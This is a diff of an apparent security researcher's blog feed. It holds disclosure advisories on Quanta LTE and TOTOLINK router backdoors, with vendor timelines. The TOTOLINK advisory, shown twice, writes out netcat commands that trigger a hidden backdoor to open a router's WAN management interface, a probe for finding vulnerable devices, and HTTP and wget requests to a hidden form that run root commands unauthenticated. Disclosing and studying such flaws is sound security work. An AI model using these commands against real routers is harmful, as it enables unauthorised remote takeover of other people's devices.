+/dev/mtdblock18          80.4M      1.3M     79.1M   2% /cache
+root@homerouter:~
+</code></pre>
+<h2>Tribute to Alex</h2>
+<p>The <code>/var/alex</code> directory is used as a storage directory for logs. This in a non conventional path and seems to be named after one of the programmer's name. Hello Alex !</p>
+<p>In Samba:</p>
+<p><img alt="" src="images/2016-quanta-alex-samba.png" /></p>
+<p>In the Firmware Over The Air program:</p>
+<p><img alt="" src="images/2016-quanta-alex-sbin-fotad.png" /></p>
+<h2>Having fun with the LEDs:</h2>
+<p>This device has a lot of LEDs and an user can control them.</p>
+<p>You can recycle the router as a funny "light show" device with this command:</p>
+<pre><code>root@homerouter:/sys/class/leds# for j in *; do (while sleep 0.1; do echo 0 &gt; /sys/class/leds/$j/brightness ; sleep 0.1 ; echo 1 &gt; /sys/class/leds/$j/brightness ;done &amp;); sleep 0.1;done
+</code></pre>
+<p>The leds will start blinking like crazy. It will add some fun in this long journey.</p>
+<h2>Vendor Response</h2>
+<p>The vulnerable router is in the End Of Service cycle and will not be
+  supported anymore.</p>
+<p>The vendor considers the router is still working well.</p>
+<p>The vendor will consider security in their next product development.</p>
+<h2>Report Timeline</h2>
+<ul>
+<li>Dec 04, 2015: Vulnerabilities found by Pierre Kim.</li>
+<li>Mar 04, 2016: security@quantatw.com is contacted asking for a GPG key to exchange about vulnerabilities: email bounced.</li>
+<li>Mar 04, 2016: Quanta is contacted about vulnerabilities in their routers and how to get a security contact at Quanta.</li>
+<li>Mar 04, 2016: Quanta asks Pierre Kim about the affected device: model name, version and clear details about the vulnerabilities in order to redirect to the good IT department.</li>
+<li>Mar 04, 2016: Pierre Kim specifies the model of the Router, asks for a GPG key in order to send detailed informations and clarifies he found backdoor accounts in the default firmware, allowing an unauthenticated, remote attacker to log in to the device with the privileges of the root user.</li>
+<li>Mar 09, 2016: Pierre Kim contacts Quanta again to get a contact at the security team.</li>
+<li>Mar 12, 2016: Pierre Kim contacts Quanta again to get a contact at the security team.</li>
+<li>Mar 14, 2016: A Sale Account Manager at Quanta ("MIS department") asks if Pierre Kim gets the device from the Operator YooMee and says "The S/W is already fixed for our customer and we are not able to change it randomly for end customer. However, we appreciate your information and we will take into consideration for the s/w development in the near future."</li>
+<li>Mar 14, 2016: Pierre Kim asks for clarification and asks if the device is End of Life and unsupported, even for security patches. Pierre Kims asks Quanta about clarification for the Vendor Response in the future public Security Advisory.</li>
+<li>Mar 15, 2016: Quanta confirms the product is EOL and the released firmware was approved by the operator. Quanta can't modify of change without the customer's approval. Quanta does not have plan to patch or change FW as the product is EOL. Quanta thanks Pierre Kim for the information and will consider the findings into our next product development in the near future.</li>
+<li>Mar 15, 2016: Pierre Kim asks if Quanta encourages users to discard the unsupported router for the "Vendor Response" in the advisory because no patch will be provided by the vendor.</li>
+<li>Mar 16, 2016: Quanta considers the router is still working well but is in End Of Service cycle. Quanta doesn't encourage users to discard the router.</li>
+<li>Mar 16, 2016: Pierre Kim adapts the Vendor Response accordingly but warns Quanta he is very concerned that no security workarounds are provided by the vendor.  At this time, Quanta never asked about the security vulnerabilities in detail, nor provided a GPG key.</li>
+<li>Mar 18, 2016: Pierre Kim contacts again Quanta to ask if there is another reachable security team at Quanta. He asks again for a GPG key and demands Quanta to confirm no security patches are planned for the Quanta QDH Router.</li>
+<li>Mar 21, 2016: Quanta confirms the product is EOL. Quanta asks details about the vulnerabilities.</li>
+<li>Mar 22, 2016: Pierre Kim asks Quanta for a GPG key and states he will give a first draft without the exploits if Quanta is unable to provide a GPG key.</li>
+<li>Mar 23, 2016: Quanta asks an advisory in cleartext without exploits.</li>
+<li>Mar 23, 2016: Pierre Kim sends a draft to Quanta.</li>
+<li>Apr 04, 2016: A public advisory is sent to security mailing lists.</li>
+</ul>
+<h2>Credit</h2>
+<p>These vulnerabilities were found by Pierre Kim (<a href="https://twitter.com/PierreKimSec">@PierreKimSec</a>).</p>
+<h2>References</h2>
+<p><a href="https://pierrekim.github.io/advisories/2016-quanta-0x00.txt">https://pierrekim.github.io/advisories/2016-quanta-0x00.txt</a></p>
+<p><a href="https://pierrekim.github.io/blog/2016-04-04-quanta-lte-routers-vulnerabilities.html">https://pierrekim.github.io/blog/2016-04-04-quanta-lte-routers-vulnerabilities.html</a></p>
+<h2>Disclaimer</h2>
+<p>This advisory is licensed under a Creative Commons Attribution Non-Commercial
+Share-Alike 3.0 License: <a href="http://creativecommons.org/licenses/by-nc-sa/3.0/">http://creativecommons.org/licenses/by-nc-sa/3.0/</a></p></content>
+    </entry>
+    
+    <entry>
         <title>Why I stopped using StartSSL (Hint it involves a Chinese company)</title>
         <link href="2016-02-16-why-i-stopped-using-startssl-because-of-qihoo-360.html"/>
         <content type="html"><h3>TL;DR: The PKI plateform of <a href="https://auth.startssl.com">StartSSL</a>, an Israeli leader of free SSL certificates, is now hosted by <a href="https://en.wikipedia.org/wiki/Qihoo_360">Qihoo 360</a>, a Chinese Antivirus Company, which uses IPs from a Chinese state-owned telecommunication company.</h3>
@@ -1584,346 +2736,6 @@ Note that this laptop can be ordered without Windows, and <a href="https://pierr
     </entry>
     
     <entry>
-        <title>Backdoor and RCE found in 8 TOTOLINK router models</title>
-        <link href="2015-07-16-backdoor-and-RCE-found-in-8-TOTOLINK-products.html"/>
-        <content type="html"><h2>Product Description</h2>
-<p>TOTOLINK is a brother brand of ipTime which wins over 80% of SOHO markets in South Korea.
-TOTOLINK produces routers, wifi access points and network devices. Their products are sold worldwide.</p>
-<h2>Vulnerabilities Summary</h2>
-<p>A backdoor is present in several TOTOLINK products.
-This was confirmed by analyzing the latest firmwares and by testing the backdoor against live routers.</p>
-<p>At least 8 TOTOLINK products are affected (firmwares come from totolink.net and from totolink.cn):</p>
-<ul>
-<li>A850R-V1 : until last firwmware TOTOLINK-A850R-V1.0.1-B20150707.1612.web</li>
-<li>F1-V2 : until last firmware F1-V2.1.1-B20150708.1646.web</li>
-<li>F2-V1 : until last firmware F2-V2.1.0-B20150320.1611.web</li>
-<li>N150RT-V2 : until last firmware TOTOLINK-N150RT-V2.1.1-B20150708.1548.web</li>
-<li>N151RT-V2 : until last firmware TOTOLINK-N151RT-V2.1.1-B20150708.1559.web</li>
-<li>N300RH-V2 : until last firmware TOTOLINK-N300RH-V2.0.1-B20150708.1625.web</li>
-<li>N300RH-V3 : until last firmware TOTOLINK-N300RH-V3.0.0-B20150331.0858.web</li>
-<li>N300RT-V2 : until last firmware TOTOLINK-N300RT-V2.1.1-B20150708.1613.web</li>
-</ul>
-<p>By sending a crafted request to the WAN IP, an attacker will open the HTTP remote management interface on the Internet.
-Then an attacker can use a Remote Code Execution in the HTTP remote management interface by using the hidden /boafrm/formSysCmd form, bypassing the authentication system.</p>
-<p>We estimate there are =~ 50 000 routers affected by this backdoor.</p>
-<h2>Details - backdoor</h2>
-<p>The /etc/init.d/rcS script executes the /bin/skt binary when the router starts:</p>
-<pre><code>cat etc/init.d/rcS
-[...]
-# start web server
-boa
-skt&amp;
-</code></pre>
-<p>skt is a small MIPS binary which is a client/server program. The arguments are:</p>
-<pre><code>server: ./skt
-client: ./skt host cmd
-</code></pre>
-<p>The binary can be used in x86_64 machines using QEMU: sudo chroot . ./qemu-mips-static ./bin/skt</p>
-<p>Using skt without argument will launch a TCP daemon on port 5555 in every interface (including WAN), acting as an ECHO server.
-Using skt with arguments will send a TCP packet containing the command to the specified IP on port 5555.</p>
-<p>There are 2 main functions in <code>skt</code>:</p>
-<ul>
-<li>TcpClient is a simple TCP client.</li>
-<li>TcpServer looks like an echo server.</li>
-</ul>
-<p><strong>TcpClient:</strong></p>
-<p>It will send a TCP packet containing hel,xasf, oki,xasf or bye,xasf, depending the arguments used (1,2,3), to a remote IP on port 5555.</p>
-<p><strong>TcpServer:</strong></p>
-<p>TcpServer is an echo server listening on port 5555/tcp and  it compares strings provided by the user with hardcoded
-strings ("hel,xasf", "oki,xasf").</p>
-<p>The problem is in the sub_400B50 function:</p>
-<p><img alt="" src="images/2015-totolink-0x02-backdoor-00.png" /></p>
-<p><strong>Pseudo-code of sub_400B50:</strong></p>
-<pre><code>int32_t sub_400B50(int32_t a1, char *str, int32_t a3, int32_t a4, int32_t a5) {
-    if (strcmp(str, "hel,xasf") == 0) {
-        system("iptables -I INPUT -p tcp --dport 80 -i eth1 -j ACCEPT");
-    } else {
-        if (strcmp(str, "oki,xasf") == 0) {
-            system("iptables -D INPUT -p tcp --dport 80 -i eth1 -j ACCEPT");
-        }
-    }
-    [...]
-}
-</code></pre>
-<p>This function compares str, which is an user-given string, with 2 hardcoded strings to execute system().</p>
-<p>The analysis of the binary running on the TOTOLINK devices shows the server mode responds to 3 commands by silently executing
-system() in the background:</p>
-<ul>
-<li>
-<p>By sending "hel,xasf" to the device, the device will execute:</p>
-<p>iptables -I INPUT -p tcp --dport 80 -i eth1 -j ACCEPT</p>
-<p>This will open the HTTP remote management interface on port 80 in the eth1 interface which is the WAN interface by default.</p>
-</li>
-<li>
-<p>By sending "oki,xasf" to the device, the device will execute:</p>
-<p>iptables -D INPUT -p tcp --dport 80 -i eth1 -j ACCEPT </p>
-<p>This will close the HTTP remote management interface.</p>
-</li>
-<li>
-<p>By sending "bye,xasf" (hardcoded string in the binary) to the device, the device will do nothing</p>
-</li>
-</ul>
-<p>The iptables commands in the backdoor are hardcoded with "eth1".
-Only devices using DHCP and static IP connections are affected because the WAN IP is attached on the eth1 device.</p>
-<p>It does not affect devices using PPPoE connections, because the WAN IP is attached on the ppp device, as seen below:</p>
-<pre><code>totolink# ifconfig
-ppp0      Link encap:Point-to-Point Protocol  
-          inet addr:X.X.X.X  P-t-P:X.X.X.X  Mask:255.255.255.255
-          UP POINTOPOINT RUNNING NOARP MULTICAST  MTU:1438  Metric:1
-          RX packets:17308398 errors:0 dropped:0 overruns:0 frame:0
-          TX packets:2605290 errors:0 dropped:0 overruns:0 carrier:0
-          collisions:0 txqueuelen:64 
-          RX bytes:2803138455 (2.6 GiB)  TX bytes:277402492 (264.5 MiB)
-</code></pre>
-<p>An attacker can use these simple netcat commands to test the backdoor:</p>
-<p>To open the HTTP remote management interface on the Internet:</p>
-<pre><code>echo -ne "hel,xasf" | nc &lt;ip&gt; 5555
-</code></pre>
-<p>To close the HTTP remote management interface on the Internet:</p>
-<pre><code>echo -ne "oki,xasf" | nc &lt;ip&gt; 5555
-</code></pre>
-<p>To detect a vulnerable router:</p>
-<pre><code>echo -ne "GET / HTTP/1.1" | nc &lt;ip&gt; 5555
-
-if you see "GET / HTTP/1.1" in the answer, you likely detected a vulnerable router.
-</code></pre>
-<p><strong>HTTP remote management interface open with the backdoor:</strong></p>
-<p><img alt="" src="images/2015-totolink-0x02-backdoor-01.png" /></p>
-<h2>Details - RCE in the management interface</h2>
-<p>A hidden form in the latest firmware allows an attacker to execute commands as root by sending a HTTP request:</p>
-<pre><code>POST /boafrm/formSysCmd HTTP/1.1
-
-sysCmd=&lt;cmd&gt;&amp;apply=Apply&amp;msg=
-</code></pre>
-<p>An attacker can use wget to execute commands in the remote device:</p>
-<pre><code>wget --post-data='sysCmd=&lt;cmd&gt;&amp;apply=Apply&amp;msg=' http://ip//boafrm/formSysCmd
-</code></pre>
-<p>For instance, sending this HTTP request to the management interface will reboot the device:</p>
-<pre><code>POST /boafrm/formSysCmd HTTP/1.1
-
-sysCmd=reboot&amp;apply=Apply&amp;msg=
-</code></pre>
-<p>This wget command will do the same job:</p>
-<pre><code>wget --post-data='sysCmd=reboot&amp;apply=Apply&amp;msg=' http://ip//boafrm/formSysCmd
-</code></pre>
-<h2>Vendor Response</h2>
-<p>TOTOLINK was not contacted in regard of this case.</p>
-<h2>Report Timeline</h2>
-<ul>
-<li>Jun 25, 2015: Backdoor found by analysing TOTOLINK firmwares.</li>
-<li>Jun 26, 2015: working PoCs with RCE.</li>
-<li>Jul 16, 2015: A public advisory is sent to security mailing lists.</li>
-</ul>
-<h2>Credit</h2>
-<p>These vulnerabilities were found by Alexandre Torres and Pierre Kim (@PierreKimSec).</p>
-<h2>References</h2>
-<p>https://pierrekim.github.io/advisories/2015-totolink-0x02.txt</p>
-<h2>Disclaimer</h2>
-<p>This advisory is licensed under a Creative Commons Attribution Non-Commercial
-Share-Alike 3.0 License: http://creativecommons.org/licenses/by-nc-sa/3.0/</p>
-<p>Complete advisory:</p>
-<pre><code>-----BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA512
-
-## Advisory Information
-
-Title: Backdoor and RCE found in 8 TOTOLINK router models
-Advisory URL: https://pierrekim.github.io/advisories/2015-totolink-0x02.txt
-Blog URL: https://pierrekim.github.io/blog/2015-07-16-backdoor-and-RCE-found-in-8-TOTOLINK-products.html
-Date published: 2015-07-16
-Vendors contacted: None
-Release mode: 0days, Released
-CVE: no current CVE
-
-
-
-## Product Description
-
-TOTOLINK is a brother brand of ipTime which wins over 80% of SOHO markets in South Korea.
-TOTOLINK produces routers, wifi access points and network devices. Their products are sold worldwide.
-
-
-
-## Vulnerabilities Summary
-
-A backdoor is present in several TOTOLINK products.
-This was confirmed by analyzing the latest firmwares and by testing the backdoor against live routers.
-
-At least 8 TOTOLINK products are affected (firmwares come from totolink.net and from totolink.cn):
-
-- A850R-V1 : until last firwmware TOTOLINK-A850R-V1.0.1-B20150707.1612.web
-- F1-V2 : until last firmware F1-V2.1.1-B20150708.1646.web
-- F2-V1 : until last firmware F2-V2.1.0-B20150320.1611.web
-- N150RT-V2 : until last firmware TOTOLINK-N150RT-V2.1.1-B20150708.1548.web
-- N151RT-V2 : until last firmware TOTOLINK-N151RT-V2.1.1-B20150708.1559.web
-- N300RH-V2 : until last firmware TOTOLINK-N300RH-V2.0.1-B20150708.1625.web
-- N300RH-V3 : until last firmware TOTOLINK-N300RH-V3.0.0-B20150331.0858.web
-- N300RT-V2 : until last firmware TOTOLINK-N300RT-V2.1.1-B20150708.1613.web
-
-
-By sending a crafted request to the WAN IP, an attacker will open the HTTP remote management interface on the Internet.
-Then an attacker can use a Remote Code Execution in the HTTP remote management interface by using the hidden /boafrm/formSysCmd form, bypassing the authentication system.
-
-We estimate there are =~ 50 000 routers affected by this backdoor.
-
-
-
-## Details - backdoor
-
-The init.d script executes the /bin/skt binary when the router starts:
-
-cat etc/init.d/rcS
-[...]
-# start web server
-boa
-skt&amp;
-
-
-skt is a small MIPS binary which is a client/server program. The arguments are:
-
-server: ./skt
-client: ./skt host cmd
-
-
-The binary can be used in x86_64 machines using QEMU: sudo chroot . ./qemu-mips-static ./bin/skt
-
-Using skt without argument will launch a TCP daemon on port 5555 in every interface (including WAN), acting as an ECHO server.
-Using skt with arguments will send a TCP packet containing the command to the specified IP on port 5555.
-
-The analysis of the binary running on the TOTOLINK devices (for more details, read
-http://pierrekim.github.io/blog/2015-07-16-backdoor-and-RCE-found-in-8-TOTOLINK-products.html ) shows the server mode responds to 3 commands by silently executing
-system() in the background:
-
-
-o By sending "hel,xasf" to the device, the device will execute: iptables -I INPUT -p tcp --dport 80 -i eth1 -j ACCEPT
-
-This will open the HTTP remote management interface on port 80 in the eth1 interface which is the WAN interface by default.
-
-
-o By sending "oki,xasf" to the device, the device will execute: iptables -D INPUT -p tcp --dport 80 -i eth1 -j ACCEPT
-
-This will close the HTTP remote management interface.
-
-
-o By sending "bye,xasf" to the device, the device will do nothing
-
-
-The iptables commands in the backdoor are hardcoded with "eth1".
-Only devices using DHCP and static IP connections are affected because the WAN IP is attached on the eth1 device.
-
-It does not affect devices using PPPoE connections, because the WAN IP is attached on the ppp device, as seen below:
-
-totolink# ifconfig
-ppp0      Link encap:Point-to-Point Protocol
-inet addr:X.X.X.X  P-t-P:X.X.X.X  Mask:255.255.255.255
-UP POINTOPOINT RUNNING NOARP MULTICAST  MTU:1438  Metric:1
-RX packets:17308398 errors:0 dropped:0 overruns:0 frame:0
-TX packets:2605290 errors:0 dropped:0 overruns:0 carrier:0
-collisions:0 txqueuelen:64
-RX bytes:2803138455 (2.6 GiB)  TX bytes:277402492 (264.5 MiB)
-
-
-
-An attacker can use these simple netcat commands to test the backdoor:
-
-To open the HTTP remote management interface on the Internet:
-
-echo -ne "hel,xasf" | nc &lt;ip&gt; 5555
-
-To close the HTTP remote management interface on the Internet:
-
-echo -ne "oki,xasf" | nc &lt;ip&gt; 5555
-
-To detect a vulnerable router:
-
-echo -ne "GET / HTTP/1.1" | nc &lt;ip&gt; 5555
-
-if you see "GET / HTTP/1.1" in the answer, you likely detected a vulnerable router.
-
-
-## Details - RCE in the management interface
-
-A hidden form in the latest firmware allows an attacker to execute commands as root by sending a HTTP request:
-
-
-POST /boafrm/formSysCmd HTTP/1.1
-
-sysCmd=&lt;cmd&gt;&amp;apply=Apply&amp;msg=
-
-
-An attacker can use wget to execute commands in the remote device:
-
-wget --post-data='sysCmd=&lt;cmd&gt;&amp;apply=Apply&amp;msg=' http://ip//boafrm/formSysCmd
-
-
-For instance, sending this HTTP request to the management interface will reboot the device:
-
-
-POST /boafrm/formSysCmd HTTP/1.1
-
-sysCmd=reboot&amp;apply=Apply&amp;msg=
-
-This wget command will do the same job:
-
-wget --post-data='sysCmd=reboot&amp;apply=Apply&amp;msg=' http://ip//boafrm/formSysCmd
-
-
-
-## Vendor Response
-
-TOTOLINK was not contacted in regard of this case.
-
-
-
-## Report Timeline
-
-* Jun 25, 2015: Backdoor found by analysing TOTOLINK firmwares.
-* Jun 26, 2015: Working PoCs with RCE.
-* Jul 13, 2015: Updated firmwares confirmed vulnerable.
-* Jul 16, 2015: A public advisory is sent to security mailing lists.
-
-
-
-## Credit
-
-These vulnerabilities were found by Alexandre Torres and Pierre Kim (@PierreKimSec).
-
-
-
-## References
-
-https://pierrekim.github.io/advisories/2015-totolink-0x02.txt
-https://pierrekim.github.io/blog/2015-07-16-backdoor-and-RCE-found-in-8-TOTOLINK-products.html
-
-
-
-## Disclaimer
-
-This advisory is licensed under a Creative Commons Attribution Non-Commercial
-Share-Alike 3.0 License: http://creativecommons.org/licenses/by-nc-sa/3.0/
-
-
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1
-
-iQIcBAEBCgAGBQJVq/MLAAoJEMQ+Dtp9ky28bGEQAKcXghQtecYt4bSd+isQ7zh8
-8z6Q05F5fiReKaXSR2dFlBhulsq6o5TjIQsGB2mG/2GOthqn7KHNYwVMSGrdYNd6
-lmOD3yPnGl3c2SyuiabUEYk7FvoyZ2g71mxxyie4/dV7I3jir2DGToInjEp0IXgU
-hM6CeTFoTO5y9Z6VYHaaxI2POgqD9OojmL+1oE7h3bMiMoOftXeDh1IUSLpQddHa
-wBDHWhLXXJYNxv2vWubJaefv6gRomeaapLjODCMiMJX0Br4EZ9gzpzonOEGG+I8z
-gRwl+JO0CrxDhysiyMayU5uPsifomcWVXaEEZRdTMWDfWH0qB/f0/2zbFVMVzCVk
-17AedQyoPXWELhS7i9afZ2JCylcEHLgMhQeDQG48lQf4SCFxCyKD09pVnG13lsUC
-Ee2EQB5A7FkqcwAbq7xRnZuMd/Lpl/RuSKIby7VbqfcI1MDnKoKt9XQ9lLIulQvk
-WRnMgUxoyQ8fFzFn265qvb3a3RSWc+Yl8xRUky4IZ3jd+nbEqHdPWCKSG4D2C45J
-NHpyeY+aZ2p/hxCfJckJtzYdcZGXSVfO2FU0rr94K9XAeWXj3+RP3DOKGoTRLZCT
-7OxaHVHiB7aLXS2qta4EBYyjFVHJZOmlcyjYcKY/RhMGomWvoUegG3z7eAbjaoj0
-k2ILiaGzfv4z+aJ/iI05
-=z70S
------END PGP SIGNATURE-----
-</code></pre></content>
-    </entry>
-    
-    <entry>
         <title>Backdoor credentials found in 4 TOTOLINK router models</title>
         <link href="2015-07-16-backdoor-credentials-found-in-4-TOTOLINK-products.html"/>
         <content type="html"><pre><code>-----BEGIN PGP SIGNED MESSAGE-----
@@ -2737,6 +3549,346 @@ rXDUveDVcMt/YxA9/nKu
     </entry>
     
     <entry>
+        <title>Backdoor and RCE found in 8 TOTOLINK router models</title>
+        <link href="2015-07-16-backdoor-and-RCE-found-in-8-TOTOLINK-products.html"/>
+        <content type="html"><h2>Product Description</h2>
+<p>TOTOLINK is a brother brand of ipTime which wins over 80% of SOHO markets in South Korea.
+TOTOLINK produces routers, wifi access points and network devices. Their products are sold worldwide.</p>
+<h2>Vulnerabilities Summary</h2>
+<p>A backdoor is present in several TOTOLINK products.
+This was confirmed by analyzing the latest firmwares and by testing the backdoor against live routers.</p>
+<p>At least 8 TOTOLINK products are affected (firmwares come from totolink.net and from totolink.cn):</p>
+<ul>
+<li>A850R-V1 : until last firwmware TOTOLINK-A850R-V1.0.1-B20150707.1612.web</li>
+<li>F1-V2 : until last firmware F1-V2.1.1-B20150708.1646.web</li>
+<li>F2-V1 : until last firmware F2-V2.1.0-B20150320.1611.web</li>
+<li>N150RT-V2 : until last firmware TOTOLINK-N150RT-V2.1.1-B20150708.1548.web</li>
+<li>N151RT-V2 : until last firmware TOTOLINK-N151RT-V2.1.1-B20150708.1559.web</li>
+<li>N300RH-V2 : until last firmware TOTOLINK-N300RH-V2.0.1-B20150708.1625.web</li>
+<li>N300RH-V3 : until last firmware TOTOLINK-N300RH-V3.0.0-B20150331.0858.web</li>
+<li>N300RT-V2 : until last firmware TOTOLINK-N300RT-V2.1.1-B20150708.1613.web</li>
+</ul>
+<p>By sending a crafted request to the WAN IP, an attacker will open the HTTP remote management interface on the Internet.
+Then an attacker can use a Remote Code Execution in the HTTP remote management interface by using the hidden /boafrm/formSysCmd form, bypassing the authentication system.</p>
+<p>We estimate there are =~ 50 000 routers affected by this backdoor.</p>
+<h2>Details - backdoor</h2>
+<p>The /etc/init.d/rcS script executes the /bin/skt binary when the router starts:</p>
+<pre><code>cat etc/init.d/rcS
+[...]
+# start web server
+boa
+skt&amp;
+</code></pre>
+<p>skt is a small MIPS binary which is a client/server program. The arguments are:</p>
+<pre><code>server: ./skt
+client: ./skt host cmd
+</code></pre>
+<p>The binary can be used in x86_64 machines using QEMU: sudo chroot . ./qemu-mips-static ./bin/skt</p>
+<p>Using skt without argument will launch a TCP daemon on port 5555 in every interface (including WAN), acting as an ECHO server.
+Using skt with arguments will send a TCP packet containing the command to the specified IP on port 5555.</p>
+<p>There are 2 main functions in <code>skt</code>:</p>
+<ul>
+<li>TcpClient is a simple TCP client.</li>
+<li>TcpServer looks like an echo server.</li>
+</ul>
+<p><strong>TcpClient:</strong></p>
+<p>It will send a TCP packet containing hel,xasf, oki,xasf or bye,xasf, depending the arguments used (1,2,3), to a remote IP on port 5555.</p>
+<p><strong>TcpServer:</strong></p>
+<p>TcpServer is an echo server listening on port 5555/tcp and  it compares strings provided by the user with hardcoded
+strings ("hel,xasf", "oki,xasf").</p>
+<p>The problem is in the sub_400B50 function:</p>
+<p><img alt="" src="images/2015-totolink-0x02-backdoor-00.png" /></p>
+<p><strong>Pseudo-code of sub_400B50:</strong></p>
+<pre><code>int32_t sub_400B50(int32_t a1, char *str, int32_t a3, int32_t a4, int32_t a5) {
+    if (strcmp(str, "hel,xasf") == 0) {
+        system("iptables -I INPUT -p tcp --dport 80 -i eth1 -j ACCEPT");
+    } else {
+        if (strcmp(str, "oki,xasf") == 0) {
+            system("iptables -D INPUT -p tcp --dport 80 -i eth1 -j ACCEPT");
+        }
+    }
+    [...]
+}
+</code></pre>
+<p>This function compares str, which is an user-given string, with 2 hardcoded strings to execute system().</p>
+<p>The analysis of the binary running on the TOTOLINK devices shows the server mode responds to 3 commands by silently executing
+system() in the background:</p>
+<ul>
+<li>
+<p>By sending "hel,xasf" to the device, the device will execute:</p>
+<p>iptables -I INPUT -p tcp --dport 80 -i eth1 -j ACCEPT</p>
+<p>This will open the HTTP remote management interface on port 80 in the eth1 interface which is the WAN interface by default.</p>
+</li>
+<li>
+<p>By sending "oki,xasf" to the device, the device will execute:</p>
+<p>iptables -D INPUT -p tcp --dport 80 -i eth1 -j ACCEPT </p>
+<p>This will close the HTTP remote management interface.</p>
+</li>
+<li>
+<p>By sending "bye,xasf" (hardcoded string in the binary) to the device, the device will do nothing</p>
+</li>
+</ul>
+<p>The iptables commands in the backdoor are hardcoded with "eth1".
+Only devices using DHCP and static IP connections are affected because the WAN IP is attached on the eth1 device.</p>
+<p>It does not affect devices using PPPoE connections, because the WAN IP is attached on the ppp device, as seen below:</p>
+<pre><code>totolink# ifconfig
+ppp0      Link encap:Point-to-Point Protocol  
+          inet addr:X.X.X.X  P-t-P:X.X.X.X  Mask:255.255.255.255
+          UP POINTOPOINT RUNNING NOARP MULTICAST  MTU:1438  Metric:1
+          RX packets:17308398 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:2605290 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:64 
+          RX bytes:2803138455 (2.6 GiB)  TX bytes:277402492 (264.5 MiB)
+</code></pre>
+<p>An attacker can use these simple netcat commands to test the backdoor:</p>
+<p>To open the HTTP remote management interface on the Internet:</p>
+<pre><code>echo -ne "hel,xasf" | nc &lt;ip&gt; 5555
+</code></pre>
+<p>To close the HTTP remote management interface on the Internet:</p>
+<pre><code>echo -ne "oki,xasf" | nc &lt;ip&gt; 5555
+</code></pre>
+<p>To detect a vulnerable router:</p>
+<pre><code>echo -ne "GET / HTTP/1.1" | nc &lt;ip&gt; 5555
+
+if you see "GET / HTTP/1.1" in the answer, you likely detected a vulnerable router.
+</code></pre>
+<p><strong>HTTP remote management interface open with the backdoor:</strong></p>
+<p><img alt="" src="images/2015-totolink-0x02-backdoor-01.png" /></p>
+<h2>Details - RCE in the management interface</h2>
+<p>A hidden form in the latest firmware allows an attacker to execute commands as root by sending a HTTP request:</p>
+<pre><code>POST /boafrm/formSysCmd HTTP/1.1
+
+sysCmd=&lt;cmd&gt;&amp;apply=Apply&amp;msg=
+</code></pre>
+<p>An attacker can use wget to execute commands in the remote device:</p>
+<pre><code>wget --post-data='sysCmd=&lt;cmd&gt;&amp;apply=Apply&amp;msg=' http://ip//boafrm/formSysCmd
+</code></pre>
+<p>For instance, sending this HTTP request to the management interface will reboot the device:</p>
+<pre><code>POST /boafrm/formSysCmd HTTP/1.1
+
+sysCmd=reboot&amp;apply=Apply&amp;msg=
+</code></pre>
+<p>This wget command will do the same job:</p>
+<pre><code>wget --post-data='sysCmd=reboot&amp;apply=Apply&amp;msg=' http://ip//boafrm/formSysCmd
+</code></pre>
+<h2>Vendor Response</h2>
+<p>TOTOLINK was not contacted in regard of this case.</p>
+<h2>Report Timeline</h2>
+<ul>
+<li>Jun 25, 2015: Backdoor found by analysing TOTOLINK firmwares.</li>
+<li>Jun 26, 2015: working PoCs with RCE.</li>
+<li>Jul 16, 2015: A public advisory is sent to security mailing lists.</li>
+</ul>
+<h2>Credit</h2>
+<p>These vulnerabilities were found by Alexandre Torres and Pierre Kim (@PierreKimSec).</p>
+<h2>References</h2>
+<p>https://pierrekim.github.io/advisories/2015-totolink-0x02.txt</p>
+<h2>Disclaimer</h2>
+<p>This advisory is licensed under a Creative Commons Attribution Non-Commercial
+Share-Alike 3.0 License: http://creativecommons.org/licenses/by-nc-sa/3.0/</p>
+<p>Complete advisory:</p>
+<pre><code>-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA512
+
+## Advisory Information
+
+Title: Backdoor and RCE found in 8 TOTOLINK router models
+Advisory URL: https://pierrekim.github.io/advisories/2015-totolink-0x02.txt
+Blog URL: https://pierrekim.github.io/blog/2015-07-16-backdoor-and-RCE-found-in-8-TOTOLINK-products.html
+Date published: 2015-07-16
+Vendors contacted: None
+Release mode: 0days, Released
+CVE: no current CVE
+
+
+
+## Product Description
+
+TOTOLINK is a brother brand of ipTime which wins over 80% of SOHO markets in South Korea.
+TOTOLINK produces routers, wifi access points and network devices. Their products are sold worldwide.
+
+
+
+## Vulnerabilities Summary
+
+A backdoor is present in several TOTOLINK products.
+This was confirmed by analyzing the latest firmwares and by testing the backdoor against live routers.
+
+At least 8 TOTOLINK products are affected (firmwares come from totolink.net and from totolink.cn):
+
+- A850R-V1 : until last firwmware TOTOLINK-A850R-V1.0.1-B20150707.1612.web
+- F1-V2 : until last firmware F1-V2.1.1-B20150708.1646.web
+- F2-V1 : until last firmware F2-V2.1.0-B20150320.1611.web
+- N150RT-V2 : until last firmware TOTOLINK-N150RT-V2.1.1-B20150708.1548.web
+- N151RT-V2 : until last firmware TOTOLINK-N151RT-V2.1.1-B20150708.1559.web
+- N300RH-V2 : until last firmware TOTOLINK-N300RH-V2.0.1-B20150708.1625.web
+- N300RH-V3 : until last firmware TOTOLINK-N300RH-V3.0.0-B20150331.0858.web
+- N300RT-V2 : until last firmware TOTOLINK-N300RT-V2.1.1-B20150708.1613.web
+
+
+By sending a crafted request to the WAN IP, an attacker will open the HTTP remote management interface on the Internet.
+Then an attacker can use a Remote Code Execution in the HTTP remote management interface by using the hidden /boafrm/formSysCmd form, bypassing the authentication system.
+
+We estimate there are =~ 50 000 routers affected by this backdoor.
+
+
+
+## Details - backdoor
+
+The init.d script executes the /bin/skt binary when the router starts:
+
+cat etc/init.d/rcS
+[...]
+# start web server
+boa
+skt&amp;
+
+
+skt is a small MIPS binary which is a client/server program. The arguments are:
+
+server: ./skt
+client: ./skt host cmd
+
+
+The binary can be used in x86_64 machines using QEMU: sudo chroot . ./qemu-mips-static ./bin/skt
+
+Using skt without argument will launch a TCP daemon on port 5555 in every interface (including WAN), acting as an ECHO server.
+Using skt with arguments will send a TCP packet containing the command to the specified IP on port 5555.
+
+The analysis of the binary running on the TOTOLINK devices (for more details, read
+http://pierrekim.github.io/blog/2015-07-16-backdoor-and-RCE-found-in-8-TOTOLINK-products.html ) shows the server mode responds to 3 commands by silently executing
+system() in the background:
+
+
+o By sending "hel,xasf" to the device, the device will execute: iptables -I INPUT -p tcp --dport 80 -i eth1 -j ACCEPT
+
